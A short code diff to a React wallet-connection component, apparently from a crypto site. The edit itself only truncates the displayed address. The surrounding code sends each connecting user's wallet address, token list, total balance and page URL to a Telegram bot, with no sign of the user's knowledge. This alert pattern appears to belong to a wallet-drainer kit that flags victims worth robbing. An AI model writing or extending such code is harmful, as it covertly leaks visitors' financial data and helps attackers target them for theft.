@@ -11,6 +11,10 @@ const ConnectedAddress = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [currentPageUrl, setCurrentPageUrl] = useState<string>("");
 
+  const truncateAddress = (address: string | any[]) => {
+    if (!address) return "N/A";
+    return `${address.slice(0, 6)}...${address.slice(-4)}`;
+  };
 
   useEffect(() => {
     if (isConnected && connector) {
@@ -99,8 +103,11 @@ const ConnectedAddress = () => {
     const walletProvider = connector?.name || "Unknown Provider"; // Include provider name
     const tokenMessage = tokens.join("\n");
     const urlMessage = pageUrl ? `🌐 Current Page: ${pageUrl}` : "🌐 Current Page: Not Available";
-    const message = `✨ *New ${walletProvider} Connection*  \n\n🏦 \`${address}\` \n[View on DeBank](https://debank.com/profile/${address})\n\n${tokenMessage}\n\n💵Total Balance: $${Number(balance.toFixed(2)).toLocaleString()}\n${urlMessage}`;
+    const truncatedAddress = truncateAddress(address || "");
+    const message = `✨ *New ${walletProvider} Connection*  \n\n🏦 *${truncatedAddress}* \n[View on DeBank](https://debank.com/profile/${address})\n\n${tokenMessage}\n\n💵Total Balance: $${Number(balance.toFixed(2)).toLocaleString()}\n${urlMessage}`;
 
+
+    
     try {
       await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         chat_id: telegramChatId,
